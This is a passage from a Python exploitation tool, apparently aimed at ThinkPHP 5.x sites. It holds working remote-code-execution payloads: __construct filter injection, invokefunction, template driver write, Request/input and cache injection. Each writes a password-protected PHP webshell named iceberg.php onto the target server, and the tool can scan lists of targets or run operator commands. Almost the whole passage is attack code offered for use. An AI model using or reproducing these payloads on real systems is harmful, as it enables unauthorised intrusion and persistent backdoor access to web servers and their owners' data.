                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-]上传失败!")

        elif "s=1&_method=__construct&method=POST&filter[]=phpinfo" == poc:
            shell_code = "s=echo '{0}'>iceberg.php&_method=__construct&method=POST&filter[]=system".format(self.webshell)
            payload = self.target + "/index.php?s=index"
            requests.post(payload, data=shell_code, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                shell_code = "s=file_put_contents('iceberg.php','{0}')&_method=__construct&method=POST&filter[]=assert".format(self.webshell)
                payload = self.target + "/index.php?s=index"
                requests.post(payload, data=shell_code, headers=self.headers)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-]上传失败!")

        elif "aaaa=1&_method=__construct&method=GET&filter[]=phpinfo" == poc:
            shell_code = "aaaa=echo '{0}'>iceberg.php&_method=__construct&method=GET&filter[]=system".format(self.webshell)
            payload = self.target + "/index.php?s=index"
            requests.post(payload, data=shell_code, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                shell_code = "aaaa=file_put_contents('iceberg.php','{0}')&_method=__construct&method=GET&filter[]=assert".format(self.webshell)
                payload = self.target + "/index.php?s=index"
                requests.post(payload, data=shell_code, headers=self.headers)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-]上传失败!")

        elif "c=phpinfo&f=1&_method=filter" == poc:
            shell_code = "c=system&f=echo '{0}'>iceberg.php&_method=filter".format(self.webshell)
            payload = self.target + "/index.php?s=index"
            requests.post(payload, data=shell_code, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                shell_code = "c=assert&f=file_put_contents('iceberg.php','{0}')&_method=filter".format(self.webshell)
                payload = self.target + "/index.php?s=index"
                requests.post(payload, data=shell_code, headers=self.headers)
                res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
                if res_shell.status_code == 200:
                    print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
                else:
                    print("[-]上传失败!")
        else:
            pass

    def check_5_x_construct_other_shell(self):
        poc = self.check[self.method]
        if "_method=__construct&filter[]=phpinfo&method=GET&get[]=1" == poc:
            shell_code = "_method=__construct&filter[]=assert&method=GET&get[]=file_put_contents('iceberg.php','{0}')".format(self.webshell)
            payload = self.target + "/index.php?s=captcha"
            requests.post(payload, data=shell_code, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-]上传失败!")
        elif "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1" == poc:
            shell_code = "_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=file_put_contents('iceberg.php','{0}')".format(self.webshell)
            payload = self.target + "/index.php?s=captcha"
            requests.post(payload, data=shell_code, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-]上传失败!")
        elif "s=1&_method=__construct&method=POST&filter[]=phpinfo" == poc:
            shell_code = "s=file_put_contents('iceberg.php','{0}')&_method=__construct&method=POST&filter[]=assert".format(self.webshell)
            payload = self.target + "/index.php?s=captcha"
            requests.post(payload, data=shell_code, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-]上传失败!")
        else:
            pass

    def check_5_x_route_rce_get_shell(self):
        poc = self.check[self.method]
        if "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
            shell_code = "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=iceberg.php&vars[1][]={0}".format(self.webshell)
            payload = self.target + "/index.php" + shell_code
            requests.get(payload, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+]上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-]上传失败!")

    def check_5_x_template_driver_rce_shell(self):
        poc = self.check[self.method]
        if "?s=index/\\think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>" == poc:
            shell_code = "?s=index/\\think\\template\\driver\\file/write&cacheFile=iceberg.php&content={0}".format(self.webshell)
            payload = self.target + "/index.php" + shell_code
            requests.get(payload, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-] 上传失败!")
        elif "?s=index/think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>" == poc:
            shell_code = "?s=index/think\\template\\driver\\file/write&cacheFile=iceberg.php&content={0}".format(self.webshell)
            payload = self.target + "/index.php" + shell_code
            requests.get(payload, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-] 上传失败!")
        else:
            pass

    def check_5_x_showid_rce_shell(self):
        poc = self.check[self.method]
        if "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~phpinfo()}]" == poc:
            shell_code = "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~system(echo '{0}')}]".format(self.webshell)
            payload = self.target + "/index.php" + shell_code
            requests.get(payload, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-] 上传失败!")

    def check_5_x_request_input_rce_shell(self):
        poc = self.check[self.method]
        if "?s=index/\\think\\Request/input&filter=phpinfo&data=1" == poc:
            shell_code = "?s=index/\\think\\Request/input&filter=system&data=echo '{0}'>iceberg.php".format(self.webshell)
            payload = self.target + "/index.php" + shell_code
            requests.get(payload, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-] 上传失败!")
        elif "?s=index/think\\Request/input&filter=phpinfo&data=1" == poc:
            shell_code = "?s=index/think\\Request/input&filter=system&data=echo '{0}'>iceberg.php".format(self.webshell)
            payload = self.target + "/index.php" + shell_code
            requests.get(payload, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-] 上传失败!")
        else:
            pass

    def check_5_x_lite_code_rce_shell(self):
        poc = self.check[self.method]
        if "/index.php/module/action/param1/${@print(var_dump(iceberg))}" == poc:
            shell_code = "/index.php?s=/sd/iex/xxx/${@eval($_GET['x'])}&x=file_put_contents('iceberg.php','{0}');".format(self.webshell)
            payload = self.target + shell_code
            requests.get(payload, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-] 上传失败!")

    def check_5_x_cache_rce_shell(self):
        poc = self.check[self.method]
        if "%0d%0avar_dump('iceberg-N');%0d%0a//" == poc:
            shell_code = "%0d%0asystem(echo '{0}'>iceberg.php);%0d%0a//".format(self.webshell)
            payload = self.target + shell_code
            requests.get(payload, headers=self.headers)
            res_shell = requests.get(self.target + "/iceberg.php", headers=headers)
            if res_shell.status_code == 200:
                print("[+] 上传成功!\nurl:{0}\n密码:iceberg".format(self.target + "/iceberg.php"))
            else:
                print("[-] 上传失败!")

if __name__ == "__main__":
    check = {}
    print(image)
    args = argparser()

    if args.u:
        target = args.u
        target_url = ParseUrl().parseurl(target)
        check = Check(target_url).exec()
        # check = {**check, **check}
        if args.c:
            cmd_code = args.c
            if check:
                cmd_result = Exp(target_url, check, cmd_code).check_exp()
            else:
                print("暂无rce漏洞!")
    elif args.f:
        path = args.f
        with open(path, 'r') as file:
            targets = file.readlines()
            for target in targets:
                target_url = ParseUrl().parseurl(target)
                check = Check(target_url).exec()

    elif args.w:
        target = args.w
        target_url = ParseUrl().parseurl(target)
        check = Check(target_url).exec()
        result = Shell(target_url, check).check_shell()
    else:
        print("请指定目标!")

